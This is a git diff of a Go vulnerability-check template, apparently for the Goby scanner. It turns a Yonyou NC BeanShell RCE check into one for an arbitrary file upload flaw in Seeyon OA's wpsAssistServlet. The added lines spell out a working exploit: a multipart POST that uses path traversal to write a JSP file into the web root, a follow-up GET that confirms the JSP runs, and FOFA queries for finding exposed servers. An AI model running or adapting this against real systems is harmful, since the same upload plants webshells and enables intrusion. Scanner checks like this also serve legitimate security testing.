@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "致远OA wpsAssistServlet 任意文件上传漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"致远互联-OA\" || product=\"致远互联-OA\"",
+  "GobyQuery": "app=\"致远互联-OA\" || product=\"致远互联-OA\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,8 +29,41 @@ func init() {
     "AND",
     {
       "Request": {
+        "method": "POST",
+        "uri": "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"
+        },
+        "data_type": "text",
+        "data": "--59229605f98b8cf290a7b8908b34616b\nContent-Disposition: form-data; name=\"upload\"; filename=\"123.xls\"\nContent-Type: application/vnd.ms-excel\n\n<% out.println(\"seeyon_vuln\");%>\n--59229605f98b8cf290a7b8908b34616b--"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "success",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/debugggg.jsp",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +84,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "seeyon_vuln",
             "bz": ""
           }
         ]
@@ -107,7 +140,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "致远OA wpsAssistServlet 任意文件上传漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +149,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "zhiyuan OA wpsAssistServlet upload file",
       "Product": "",
       "Description": "",
       "Recommendation": "",
